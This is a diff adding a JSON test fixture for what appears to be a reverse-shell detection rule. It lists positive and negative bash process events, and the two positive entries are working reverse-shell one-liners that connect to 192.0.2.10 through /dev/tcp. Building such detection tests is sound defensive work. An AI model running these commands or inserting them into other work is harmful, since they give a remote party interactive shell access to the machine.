@@ -1,0 +1,26 @@
+{
+  "positive": [
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"
+    },
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "/bin/bash -c 'sh -i >& /dev/tcp/192.0.2.10/9001 0>&1'"
+    }
+  ],
+  "negative": [
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -c 'echo hello > /dev/null'"
+    },
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -c 'exec 3<>/dev/tcp/example.invalid/80'"
+    },
+    {
+      "Image": "/usr/bin/ls",
+      "CommandLine": "ls /dev/tcp"
+    }
+  ]
+}
